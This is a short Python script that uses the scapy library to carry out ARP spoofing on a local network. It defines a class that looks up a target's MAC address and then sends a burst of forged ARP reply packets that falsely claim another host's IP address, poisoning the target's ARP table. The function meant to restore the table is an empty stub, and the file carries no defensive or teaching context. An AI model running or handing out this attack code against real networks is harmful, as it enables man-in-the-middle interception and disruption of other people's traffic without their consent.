from scapy.all import *
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
reset=Style.RESET_ALL

class ArpSpoofer():
    # Class to handle arp spoofing.
    def get_mac_addr(self,ip):
        # Function to get mac address from given ip.
        try:
            ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_packet=ARP(pdst=ip)
            sent_packet=ether_frame/arp_packet
            answer,unanswer=srp(sent_packet)
            return answer[0].answer.src
        
        except Exception as e:
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
    
    def spoof_restorer(self,src_ip,src_mac,dest_ip,dest_mac):
        # Funtion to restore spoofed table into normal.
        pass
    
    def arp_spoofer(self,spoofing_ip,target_ip,target_mac,interface):
        # Function to create spoofed replay packet creation.
        print(target_mac)
        for i in range(1,50):
            try:
                ether_frame=Ether(dst=target_mac)
                arp_rpacket=ARP(op=2,psrc=spoofing_ip,hwdst=target_mac,pdst=target_ip)
                replay_packet=ether_frame / arp_rpacket
                sendp(replay_packet,iface=interface)
            except KeyboardInterrupt:
                break
            
            except Exception as e:
                print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
                break